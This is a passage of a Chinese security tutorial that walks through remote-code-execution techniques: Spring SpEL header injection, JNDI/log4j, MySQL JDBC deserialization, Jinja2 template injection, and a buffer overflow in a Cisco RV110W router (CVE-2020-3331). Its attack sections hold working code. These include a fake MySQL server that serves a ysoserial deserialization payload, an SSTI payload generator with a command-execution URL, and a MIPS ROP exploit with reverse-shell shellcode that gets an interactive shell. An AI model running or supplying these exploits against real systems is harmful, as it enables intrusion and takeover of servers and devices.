![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIq8SrzB6Dicm9ZhM5tfcNeylTdstr0PX168tzKp5eK2W2icHUq0qWSYkw/640?wx_fmt=png)

        往下跟进 processRequest

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLICqK56g9ESu7Ar924OeickEOgq9WCuEXq2tyictBibu2bEn03SE3vJuo1w/640?wx_fmt=png)

        注意这里是 header，这也是为啥 payload 在 header 中传输

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIibguFFR6khdH6CGhxs2W7DpibXfI8RXMJ3c73p1G5tjO0rRp4hiaYKP0Q/640?wx_fmt=png)

        然后跟进 apply 进去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIRbDDt1TaW4RlCqicUiasTHsiaPyRM8wPcMMqtsCVYicJebMfVJALtmqBpQ/640?wx_fmt=png)

        传进来的数据跟进 doApply，在进去 doApply 方法看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIqzsS9gunUkZtfibGQgA28GDD4X25bk0oDDBib3QDhupeQfZiaKDjMlB9Q/640?wx_fmt=png)

        跟进 apply

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLIvCcyOZm0ltQz0A9nx7VnKrgqCxLx8KNamwzyzs1EfkuK0nQvynvC2g/640?wx_fmt=png)

        发现参数到了 route, 在跟进 route

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLILpQSO2GWuNOO4zf0PEZ30ySYZEC2fCLibcP8nuKicw7Zp6aO3tvEg7tw/640?wx_fmt=png)

        判断请求头有没有 spring 那段，如果有的话就进入到 functionFromExpression 里代入，那我们进去这个函数看一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDpwojVxxlPdxkMumWhWRLINqt6ib7Fd8OLb3dpE1xvqvPhVmzKea05SM30pCKCsD2fIhzKWtYtzbQ/640?wx_fmt=png)

        跟开头一样，这里的 parseExpression 直接带入进来解析，所以也就成功的 rce 了

12  

**12**

JNDI 注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59sFw3qPgNfrXOu59YYd1WiaziaYDicZicIGGNx4q5BWiaanOgbabMWZNqwHg/640?wx_fmt=png)

        这里的 jndiName 可控，我们就可以直接造成 Rce

        “RMI（Remote Method Invocation），是一种跨 JVM 实现方法调用的技术。

        在 RMI 的通信方式中，由以下三个大部分组成：

        Client

        Registry

        Server

        其中 Client 是客户端，Server 是服务端，而 Registry 是注册中心。

        客户端会 Registry 取得服务端注册的服务，从而调用服务端的远程方法。

        注册中心在 RMI 通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。

        服务端在注册中心注册服务时，需要提供一个 key 以及一个 value，这个 value 是一个远程对象，Registry 会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过 Registry 获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。”

        Jndi 注入最知名的案例应该就是 log4j 了

        原理分析

        解开 jar 包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59P89QYNXrbvxbJmEPNIRosDQBIPLd0LsnEokUqa7icV6UCtRSvicwB3SQ/640?wx_fmt=png)

        入口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG597OOyPeDGllZfFNLsKial1KAdKfns9TKP6OcmLVwug12JIkuhZicnFOlQ/640?wx_fmt=png)

        主要是 127-132 这段  

        127 逻辑进去后，129 行判断字符串中是否包含 ${ 如果包含，就将从这个字符开始一直到字符串结束替换为下面的值，然后就是 132 替换值的地方

        跟进 getStrSubstitutor()

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59DBwlpRQZUNzSXIF1YWq1604zKibaic4wWfUOrHzU7eFLVhBm2WC4Bdbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59f51ucmqP1fcAHYNsnAJW5CqoTC6omm6gkq8jKa27NvpQAbvLRicjOGA/640?wx_fmt=png)

13  

**13**

JDBC 反序列化

        Java 还有一种独有的 RCE 方法就是 JDBC 可控配合反序列化的 RCE

        官网下载 8.0.12 版本：https://downloads.mysql.com/archives/c-j/

        看着两个参数组成的 payload

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59X8vAB76wzQeK69iba7g5ZhzoBNPye7XJqvm7zxftAy8BoKicMk01FS5A/640?wx_fmt=png)

        官方介绍

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG5932iav0JBvbKZ84rvLNNwu1o8ScGNjK6ecWqPicWNCuNarNs9siaQpKa4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59Vz1uLq0IEiaHH3G0ib5DEyt8sVvicbz28Z2wMPcBPNFa7RcIXjfrlvfibg/640?wx_fmt=png)

  queryInterceptors：一个逗号分割的 Class 列表（实现了 com.mysql.cj.interceptors.QueryInterceptor 接口的类），在 Query” 之间” 进行执行来影响结果。（效果上来看是在 Query 执行前后各插入一次操作）；

autoDeserialize：自动检测与反序列化存在 BLOB 字段中的对象；

        设置为 com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 这个类之后，每次执行查询语句，都会调用拦截器的 preProcess 和 postProcess 方法

        看到

\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\interceptors\ServerStatusDiffInterceptor.java

文件中的 preProcess 里的 populateMapWithSessionStatusValues，跟进这个函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59Xgehz3am34X8Lp5zEc8KEcnic7hJEaYfDniaPBUiaZ4pXsDCw0oibFK6Lw/640?wx_fmt=png)

        跟进去之后发现先执行了 show session status，然后传到 resultSeToMap 中，跟进这个函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59YDTeYdIMB4U4PbibzYg6IPXwnZiaWbRRlFEbQibribpI98Fyfxwu3W3tUw/640?wx_fmt=png)

        我们可以看到在 resultSeToMap 中出现了 getObject

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59nhicgXgOcQamGVoqmX7sXVUvbiceicWk0jY4ugPAXOfsh6NZHFzCY7AIA/640?wx_fmt=png)

        这里跟进的是

\mysql-connector-java-8.0.12\src\main\user-impl\java\com\mysql\cj\jdbc\result\ResultSetImpl.java

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59pSzZlRFqcHNEIbiaqkRurmRxHWE43z1AaC5dmsXPePsUicCcNyp3hDKw/640?wx_fmt=png)

        可以看到 try 语句中存在 readObject

        最后贴上 Tri0mphe7 师傅的脚本

```
# -*- coding:utf-8 -*-
#@Time : 2020/7/27 2:10
#@Author: Tri0mphe7
#@File : server.py
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
//file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a
    file= r'a'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))
        # 1.先发送第一个问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)
            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
_payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
 _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn,response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn,response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                //获取payload
                payload_content=get_payload_content()
                //计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                //计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break

if __name__ == '__main__':
     HOST ='0.0.0.0'
     PORT = 3309

     sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
     sk.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
     sk.bind((HOST, PORT))
     sk.listen(1)

     print("start fake mysql server listening on {}:{}".format(HOST,PORT))

     run()
```

14  

**14**

SSTI 注入

        除了这些还有一种 rce 非常的少见，就是 ssti 注入到 rce

        简单 demo

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59qo42eHK4XTrB1q61NPdJShTAIglMk56enlzKeTFic0xMfuNH63sVcdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG598Hau4mMgw1EYQXVY7RbEL9PUh91xLbtsib8eEWR3zcb8kLZnT4nrLXg/640?wx_fmt=png)

        我们可以看到计算成功，那么就证明这个点是存在 ssti 注入的  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59mItGJdqlIQlORCIsajVByWWCI4dbg2v0ulKP7k703mFzwHTKzia3chw/640?wx_fmt=png)

        用网上的脚本跑一下 payload

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59iaiaIhs6wcxCEymVEiafFb8IenT3fbgNuBOtja7qemduWSaB0awwwgGjQ/640?wx_fmt=png)

```
from flask import Flask
from jinja2 import Template

searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__','__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__','__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__','__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__','__call__', "__instancecheck__", '__subclasscheck__', '__len__','__length_hint__', '__missing__','__getitem__', '__setitem__','__iter__','__delitem__', '__reversed__', '__contains__', '__add__','__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
     for attr in searchList:
          if hasattr(i, attr):
              if eval('str(i.'+attr+')[1:9]') == 'function':
                  for goal in neededFunction:
                      if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                         if pay != 1:
                              print(i.__name__,":", attr, goal)
                         else:
                              print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\")}}{% endif %}{% endfor %}")
```

        我们从 output 里随便抽一个 payload

        例如第一行这个

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59C2XxqutUavYVpcibicQtka13eroKnGCfamEiaMA8oPzmJQ7qYyOEV0yBQ/640?wx_fmt=png)

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_ModuleLock' %}{{c.__init__.__globals__['__builtins__'].eval("print('ZACTEST')") }}{%endif %}{% endfor %}
```

        然后打开我们的 web 服务，就是最开始的 demo

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59HCRCdVeJHKGic8ys2VAjWdqyoaZfzoP0YrcUQnxb2SW7be3tdlhvSicA/640?wx_fmt=png)

        打进去 payload，我们可以看到成功 print 输出 ZACTEST

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59DZOvibgwl514JDibQclKo2kjvBZIBHsPycDDib98DanvGa2vzv1sZK5Cg/640?wx_fmt=png)

        使用 os 模块执行 whoami

```
http://127.0.0.1:5000/?name={%for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}{% endif %}{% endfor %}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59pyXQxxcp091tpOI3lfcT3ZaFA4w5gdUSL0J0oYT1ZiaUaufxu9kiadgg/640?wx_fmt=png)

15  

**15**

缓冲区溢出

        因为我并不是玩 pwn 的，所以对缓冲区溢出 RCE 几乎完全不懂，以下就直接把大佬文章搬过来（已经得到授权）原文链接出处：

https://ret2w1cky.com/2021/11/12/RV110W%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/

        假设我们已经通过类似固件解包，串口通信等方法获取了路由器的固件等我们可以尝试通过寻找已知的 CVE 来定位可能的 rce, 这里是寻找到了 CVE-2020-3331 这个漏洞。

        由于并没有对于漏洞点的一个精确定位 我们现在要一点一点的摸索；首先，在上面的 Nmap 扫描中，我们知道网站是开放了 443 端口的。因此，上内部服务器之后 netstat 确定文件是最好的方式了。但是，因为某一些原因，其中的 netstst 命令可能因为版本过低没有办法使用一些参数，所以，我决定开个 http 服务器，把高等级的 busybox 传上去

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59t6XVQdDkr5oWeFicyia3g3Jh9Yia1sevskl3XtvHbaaibknicYMKFbMeWsA/640?wx_fmt=png)

        可以看到，443 端口绑定的正是 httpd 文件，现在我们已经可以确定漏洞文件了，现在只需要查找漏洞的函数了

        这时候，我们就可以使用 diff 查找也就是查找两个文件不同的地方，我们使用 Bindiff 工具, 现在，我们解包新版本的和旧版本进行比对：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59PJgyCnjeHViaiaDtOLBSetGSv3U72NEYAs1QetmicoFkytSB7Iw85znibw/640?wx_fmt=png)

        这里 可以说越红就代表差异越大 但是 你越往下看就会发现唯一这个 guest_logout_cgi 和 web 有点关系 右键这个函数 View flow graph

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59mCaV4GNDKpgraiaz2iadm5XPQFBR0wdjUosE2GnLoTxkBgQ4o4la6hBw/640?wx_fmt=png)

        嗯 随便一看就可以看到这里有个高风险函数 `sscanf` 地址在 `0x431ba8`

        其中 sscanf 的条件 "%[^;];%*[^=]=%[^\n]" 里，% 表示选择，%* 表示过滤，中括号括起来的是类似正则

%[^;]：分号前的所有字符都要

%*[^=]：分号后，等号前的字符都不要

%[^\n]：等号后，换行符前的所有字符都要

        也就是说，如果输入字符串”aaa;bbb=ccc”，会将 aaa 和 ccc 写入对应变量，并没有限制长度，会导致栈溢出

        找到了这段代码 我们现在要对伪代码进行分析 看看需要达到那些分支才能达到 `sscanf 函数 `

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59ibWbXMyRrM6nEScze7QesOlxODEfEPd5dK7B4vA2RjlSYfchicSczdpA/640?wx_fmt=png)

        通过查阅函数 可以知道我们需要让...

*   cmac：mac 格式
    
*   cip：ip 格式
    
*   submit_button：包含 status_guestnet.asp
    

        现在知道了页面是 `/guest_logout.cgi` 了 需要达成这些条件 那么 我们就可以开始试图溢出了 exp 如下 ：

```
import requests
url = "https://192.168.1.1/guest_logout.cgi"
payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+'a'*100,"cip":"192.168.1.100"}
```

        其中 我们还需要确定是用 get 还是 post 进行攻击 具体还是自己试一试吧 最后会发现只有 post 攻击下 web 后台会转圈圈 所以可以确定是 post 攻击方法

        gdb-server 我们内部使用

https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%

使用 wget 下载到 /tmp 目录 通过上一次的 `netstat` 扫描 确定进程号 并且绑定进程号 格式如下:

        ./gdb.server :<绑定端口> --attach < 绑定进程 >

        在 exp 上 我利用 cyclic 脚本来确定溢出点

exp 如下：

```
import requests
import requests
payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
#(cyclic 200)
url = "https://10.10.10.1/guest_logout.cgi"
payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+payload,"cip":"192.168.1.100"}
requests.packages.urllib3.disable_warnings()
requests.post(url, data=payload, verify=False, timeout=1)
```

        打开 gdb multiarch 这样设置

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59wGC2eGiahTDLhYcaPAhCJWvRqKV0SBE7WMiaKkoB5TqdibUx0ibfWI7PWA/640?wx_fmt=png)

        #(记得按 c)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59HVvSu4wuKmpJHDWKib5XwYrlFnrOQGlmm5ibTWhPzOfayc4mbqjCtQyg/640?wx_fmt=png)

        发送 exp 后 成功 确定了溢出点为 aaaw 通过 cyclic -l 查询 发现为 85

        现在 我们就可以准备构造语句了

 **ROP Get shell**

        mips 架构硬件并不支持 nx，所以利用方式通常为劫持程序流执行 shellcode

        由于 sscanf 栈溢出，所以不能有空字节，而程序本身的 gadget 都是有空字节的。。。

        这时候自然想到用 libc 的 gadget，但是，比较诡异的一点是，它的 libc 基址每次都不变

        这里 我们可以通过 `cat /proc/<pid>/maps` 查看

        所以 我们就要通过 ret2libc 的方式 getshell 我们选择 / lib/libc.so.0

        利用 mipsgadget 发现两条有用的 gadgets

        | 0x000257A0  | addiu $a0,$sp,0x58+var_40  |  jalr $s0  |

        | 0x0003D050  |  move $t9,$a0  |  jalr $a0  |

        这样会造成什么效果呢？程序返回时，程序执行流被控制为 0x257a0，去执行第一条 gadget，a0 = sp + 0x18，jmp 到 s0 寄存器，s0 寄存器存的是第二条 gadget，继而去执行第二条 gadget，将 a0 放到 t9，然后 jmp 到 a0，a0 存的是 shellcode 的地址，于是程序就会执行 shellcode

 **Shellcode**

        我们 shellcode 用 msfvenom 不会生产空字节

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59JIN5UREptiamNibXOp9ZxicicBPicYLUtibpMIlNhqaYv1K6x5ekq1tthtxw/640?wx_fmt=png)

        那么小伙伴可能要问了 * 那 s0 寄存器地址怎么算呢？*

        其实 只要用我们第一次算溢出的图用 cyclic 算就行了 也就是 `cyclic -l aaan`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59QaA541ng2xkyicClsxebPicFx6bdbSFc0rM50DmnpEJkPhribzHiaSic0TA/640?wx_fmt=png)

Exp:

```
import requests
from pwn import *
p = listen(8788)
context.arch = 'mips'
context.endian = 'little'
context.os = 'linux'

libc = 0x2af98000
jmp_a0 = libc + 0x0003D050 # move  $t9,$a0; jalr  $a0
jmp_s0 = libc + 0x000257A0 # addiu  $a0,$sp,0x38+var_20 ; jalr  $s0 (var_20) = -20
buf = b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\x54\x0e\x3c"
buf += b"\x22\x54\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0"
buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
buf += b"\x01\x01"

payload1 = "status_guestnet.asp"
payload1 += 'a' * 49 + p32(jmp_a0) # control $s0
payload1 += (85 - 49 - 4) * 'a' + p32(jmp_s0) # control gadgets2 , retuen to jmp_s0
payload1 += 'a' * 18 + buf # control $sp + 18
url = "https://192.168.1.1/guest_logout.cgi"
payload2 = {
   "cmac":"12:af:aa:bb:cc:dd",
   "submit_button": payload1,
   "cip":"192.168.1.100"
}
requests.packages.urllib3.disable_warnings() #Hide warnings
requests.post(url, data=payload2, verify=False,timeout=1)
p.wait_for_connection()
log.success("getshell")
p.interactive()
```

        成功 getshell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59CPyHxFqfzJHAiah61jUqlJwWJLfbia2T3XEXpuzFHbaZTJN4yw4PKmHQ/640?wx_fmt=png)

16  

**16**

php 环境变量注入

        某次在 P 牛的知识星球划水，发现了一个很骚的思路如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lDHMHk4Qu0JD0iasDjJsicG59UBgsHia8fjGPEwszfVibgYJB79pdVhHqD3KAEibM2rK85UoK7ZfibljzQg/640?wx_fmt=png)

        我们可以看到两个点，putenv，传入的参数 envs 和最后的不可控变量 system

